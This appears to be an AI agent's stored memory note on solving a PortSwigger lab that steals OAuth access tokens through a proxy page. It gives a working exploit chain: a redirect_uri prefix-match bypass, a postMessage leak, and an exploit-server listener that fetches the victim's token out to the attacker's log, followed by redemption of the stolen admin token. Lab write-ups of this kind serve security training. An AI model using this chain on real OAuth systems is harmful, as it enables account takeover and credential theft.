---
metadata:
  node_type: memory
name: "PortSwigger OAuth proxy-page access token theft arm A"
description: "Solved lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page: prefix-matched redirect_uri plus comment-form postMessage leak plus OAuth /me apikey redemption."
last_updated: 2026-10-10T13:42:41+08:00
created: 2026-10-10T13:42:41+08:00
---

## 2026-10-10 lab-oauth-stealing-oauth-access-tokens-via-a-proxy-page (arm A, solved)

Instance 0ae80026...web-security-academy.net (reused:false); OAuth server oauth-0a1400...oauth-server.net,
client_id=vckts3t6k38h272srnynz, registered redirect_uri=/oauth-callback, response_type=token (fragment).

Chain, all HTTP through pieces, no browser needed:
1. Proxy page = `/post/comment/comment-form`, embedded as an iframe on /post?postId=1. Fetch it with bin_get,
   NOT the body snippet: script-stripping hides the flaw. Its inline script is
   `parent.postMessage({type:'onload', data: window.location.href}, '*')` - it leaks its own href, fragment
   included, to whatever embeds it, with no origin check.
2. redirect_uri validation is a prefix match on the registered URI, not an exact match: the exact
   `/post/comment/comment-form` returns 400 redirect_uri_mismatch, while
   `/oauth-callback/../post/comment/comment-form` returns 302 /interaction/<id>. A raw_matrix sweep of 10 shapes
   (dot-segments, %2f, .%2e, ..;, ....//) all pass -> plain startsWith, percent-decoded before the check.
   The browser normalizes the dot-segments when it follows the 302, so the token fragment lands on the proxy
   page while the OAuth server only ever saw the registered prefix.
3. Exploit page on the exploit server: a message listener doing
   `fetch('/stolen='+encodeURIComponent(JSON.stringify(e.data)), {mode:'no-cors'})` plus
   `<iframe src=".../auth?client_id=...&redirect_uri=https://LAB/oauth-callback/../post/comment/comment-form&response_type=token&nonce=1337&scope=openid%20profile%20email">`.
   In the attribute, `&` must be written `&amp;`.
4. Consent is not an obstacle: the grant is remembered per account+client, so an already-authorized session (the
   admin's) goes straight from /auth to the callback with the token. Verified by replaying the authorize URL with
   our own consented session: 302 directly to callback#access_token=...
5. Deliver (follow the DELIVER_TO_VICTIM 302). The access log shows the victim line within seconds:
   `GET /stolen={"type":"onload","data":"https://LAB/post/comment/comment-form#access_token=<ADMIN>..."}`.
6. Redemption: the API key is the OAuth server's own /me response, not a client endpoint. `GET
   https://oauth-.../me` with `Authorization: Bearer <stolen token>` returns {"sub":"administrator",
   "apikey":"...","email":"administrator@normal-user.net"}. Client-side /me, /api/me, /userinfo all 404.
7. POST /submitSolution with answer=<apikey> -> {"correct":true}; banner_verdict -> solved:true + congrats line.

Exploit-server mechanics: responseFile MUST start with `/` else 400 "File must start with /"; STORE and DELIVER
both take responseFile+responseHead+responseBody; read the log with GET /log, the victim UA line is the anchor.

